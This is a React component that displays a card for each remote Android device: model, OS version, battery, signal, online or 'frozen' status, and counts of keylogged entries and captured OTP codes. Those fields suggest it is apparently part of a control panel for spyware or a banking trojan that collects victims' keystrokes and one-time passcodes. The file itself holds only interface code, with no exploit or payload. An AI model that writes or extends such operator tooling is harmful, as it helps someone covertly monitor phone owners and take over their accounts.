import { Link } from 'react-router-dom';
import type { DeviceSummary } from '@xrc/shared';

const STATUS: Record<DeviceSummary['status'], { dot: string; label: string; text: string }> = {
  online: { dot: 'bg-emerald-400', label: 'ONLINE', text: 'text-emerald-400' },
  offline: { dot: 'bg-amber-400 blink', label: 'RECONNECTING', text: 'text-amber-400' },
  frozen: { dot: 'bg-rose-400 blink', label: 'FROZEN', text: 'text-rose-400' },
};

export default function DeviceCard({ device }: { device: DeviceSummary }) {
  const st = STATUS[device.status];
  return (
    <Link
      to={`/devices/${device.id}`}
      className="block rounded-xl border border-slate-800 bg-surface p-4 hover:border-slate-600 transition-colors"
    >
      <div className="flex items-center gap-3">
        <div className="h-9 w-9 rounded-lg bg-gradient-to-br from-cyan-500 to-rose-600 flex items-center justify-center font-bold text-white text-sm shrink-0">
          {device.name[0]?.toUpperCase() ?? '?'}
        </div>
        <div className="min-w-0 flex-1">
          <div className="text-sm font-semibold text-slate-100 truncate">{device.name}</div>
          <div className="text-[10px] text-slate-500 truncate">{device.model} · {device.android}</div>
        </div>
      </div>
      <div className="mt-3 flex items-center justify-between text-[11px] font-mono text-slate-400">
        <span>🔋 {device.battery}%</span>
        <span>📶 {device.signal} dBm</span>
        <span className={st.text}>{st.label}</span>
      </div>
      <div className="mt-1 flex items-center justify-between text-[10px] text-slate-600 font-mono">
        <span>keys:{device.keylogCount} otp:{device.otpCount}</span>
        <span>{new Date(device.lastSeen).toLocaleTimeString()}</span>
      </div>
    </Link>
  );
}
